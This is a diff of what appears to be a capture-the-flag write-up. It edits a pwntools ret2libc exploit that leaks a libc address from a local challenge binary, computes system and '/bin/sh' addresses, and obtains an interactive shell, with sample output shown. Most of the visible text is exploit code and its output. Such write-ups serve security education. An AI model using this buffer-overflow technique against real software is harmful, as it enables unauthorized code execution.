@@ -180,10 +180,12 @@ payload += p64(MAIN) # loop back to main for round 2 exploit
 p.sendline(payload)
 
 p.recvuntil(b"A"*OFFSET)
+extra = u64(p.recvline().strip().ljust(8, b'\x00'))
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-leak2 = u64(p.recvline().strip().ljust(8, b'\x00'))
+# usually we would only expect one leak which is the libc address of gets
+# however I noticed there are 2 leaks here due to the lack of a null terminator \x00 in the libc address, which causes puts to continue printing other addresses (which are irrelevant in our case)
 
-log.info(f"leak: {hex(leak)}, leak2: {hex(leak2)}")
+log.info(f"leak: {hex(leak)}")
 
 p.interactive()
 ```
@@ -193,7 +195,7 @@ OUTPUT:
 ```
 [x] Starting local process './chall'
 [+] Starting local process './chall': pid 8921
-[*] leak: 0x4011f3, leak2: 0x7fa0e7f9cb60
+[*] leak: 0x7fa0e7f9cb60
 [*] Switching to interactive mode
 ```
 
@@ -254,15 +256,15 @@ payload += p64(MAIN) # loop back to main for round 2 exploit
 p.sendline(payload)
 
 p.recvuntil(b"A"*OFFSET)
+extra = u64(p.recvline().strip().ljust(8, b'\x00'))
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-leak2 = u64(p.recvline().strip().ljust(8, b'\x00'))
 
-log.info(f"leak: {hex(leak)}, leak2: {hex(leak2)}")
+log.info(f"leak: {hex(leak)}")
 
 LIBCGETSOFFSET = 0x75b60
 LIBCSYSTEMOFFSET = 0x48e50
 
-libcbase = leak2 - LIBCGETSOFFSET
+libcbase = leak - LIBCGETSOFFSET
 libcsystem = libcbase + LIBCSYSTEMOFFSET
 
 payload2 = b"A" * OFFSET
@@ -276,7 +278,7 @@ p.interactive()
 ```
 [x] Starting local process './chall'
 [+] Starting local process './chall': pid 10386
-[*] leak: 0x4011f3, leak2: 0x7fe1a85d6b60
+[*] leak: 0x7fe1a85d6b60
 [*] Switching to interactive mode
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�Z��
 [*] Got EOF while reading in interactive
@@ -323,15 +325,15 @@ payload += p64(MAIN) # loop back to main for round 2 exploit
 p.sendline(payload)
 
 p.recvuntil(b"A"*OFFSET)
+extra = u64(p.recvline().strip().ljust(8, b'\x00'))
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-leak2 = u64(p.recvline().strip().ljust(8, b'\x00'))
 
-log.info(f"leak: {hex(leak)}, leak2: {hex(leak2)}")
+log.info(f"leak: {hex(leak)}")
 
 LIBCGETSOFFSET = 0x75b60
 LIBCSYSTEMOFFSET = 0x48e50
 
-libcbase = leak2 - LIBCGETSOFFSET
+libcbase = leak - LIBCGETSOFFSET
 libcsystem = libcbase + LIBCSYSTEMOFFSET
 binsh = libcbase + 0x18a156
 
@@ -349,7 +351,7 @@ Running this script, we get a `shell()` !!
 ```
 [x] Starting local process './chall'
 [+] Starting local process './chall': pid 11487
-[*] leak: 0x4011f3, leak2: 0x7f2babd92b60
+[*] leak: 0x7f2babd92b60
 [*] Switching to interactive mode
 
 $ id
